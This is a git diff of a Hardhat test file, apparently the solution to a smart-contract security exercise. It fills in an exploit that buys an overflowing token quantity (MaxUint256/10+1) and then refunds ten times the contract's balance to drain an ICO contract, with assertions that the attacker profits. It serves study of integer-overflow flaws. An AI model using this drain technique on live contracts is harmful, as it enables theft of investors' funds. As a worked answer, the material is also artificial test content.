@@ -91,15 +91,15 @@ describe('testCOToken', function () {
 
 
     it('Test exploit', async function () {
-        await ico.connect(attacker).buy(1);
-        await ico.connect(attacker).refund(1);
+        const tokensToBuy = ethers.MaxUint256 / BigInt(10) + BigInt(1);
+        await ico.connect(attacker).buy(tokensToBuy);
+        const contractETHBalance = await ethers.provider.getBalance(ico);
+        await ico.connect(attacker).refund(contractETHBalance * BigInt(10));
     });
 
     after(async function () {
         
         expect(await ethers.provider.getBalance(ico)).to.be.equal(0);
-        expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(
-            this.initialAttackerBalancer.add(TOTAL_INVESTED).sub(ethers.utils.parseEther("0.2"))
-        );
+        expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(this.initialAttackerBalancer + TOTAL_INVESTED - ethers.parseEther("0.2"));
     });
 });
